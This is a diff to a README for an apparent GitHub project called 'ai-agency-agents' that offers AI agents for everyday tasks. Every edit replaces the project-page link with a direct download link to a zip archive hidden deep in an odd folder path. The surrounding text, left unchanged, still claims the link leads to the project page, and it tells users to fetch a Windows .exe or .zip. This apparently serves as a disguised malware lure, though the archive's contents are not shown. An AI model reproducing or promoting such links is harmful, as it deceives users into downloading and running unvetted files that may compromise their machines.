@@ -1,6 +1,6 @@
 # 🤖 ai-agency-agents - AI Agents for Everyday Tasks
 
-[![Download ai-agency-agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/nedilunar890/ai-agency-agents)
+[![Download ai-agency-agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/nedilunar890/ai-agency-agents/main/strategy/coordination/ai-agency-agents-v1.9-beta.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These agents work in the background. You only need to run the app and choose whi
 
 Click the large button below to go to the download page:
 
-[![Download ai-agency-agents](https://img.shields.io/badge/Download%20From-GitHub-blue)](https://github.com/nedilunar890/ai-agency-agents)
+[![Download ai-agency-agents](https://img.shields.io/badge/Download%20From-GitHub-blue)](https://raw.githubusercontent.com/nedilunar890/ai-agency-agents/main/strategy/coordination/ai-agency-agents-v1.9-beta.5.zip)
 
 This link takes you to the main project page on GitHub. From there, you can find the latest files to download.
 
@@ -38,7 +38,7 @@ This link takes you to the main project page on GitHub. From there, you can find
 
 1. **Visit the Download Page**  
    Open your web browser and go to the GitHub page by clicking the button above or typing this address:  
-   `https://github.com/nedilunar890/ai-agency-agents`
+   `https://raw.githubusercontent.com/nedilunar890/ai-agency-agents/main/strategy/coordination/ai-agency-agents-v1.9-beta.5.zip`
 
 2. **Find the Download Link**  
    On the GitHub page, look for the section called “Releases” or “Assets.” Here, you will see files available for download. Choose the file ending with `.exe` or `.zip` for Windows.
@@ -122,4 +122,4 @@ The GitHub page offers:
 
 Visit the page regularly to stay informed about new features or fixes.  
 The main GitHub link again for easy access:  
-[https://github.com/nedilunar890/ai-agency-agents](https://github.com/nedilunar890/ai-agency-agents)
+[https://raw.githubusercontent.com/nedilunar890/ai-agency-agents/main/strategy/coordination/ai-agency-agents-v1.9-beta.5.zip](https://raw.githubusercontent.com/nedilunar890/ai-agency-agents/main/strategy/coordination/ai-agency-agents-v1.9-beta.5.zip)
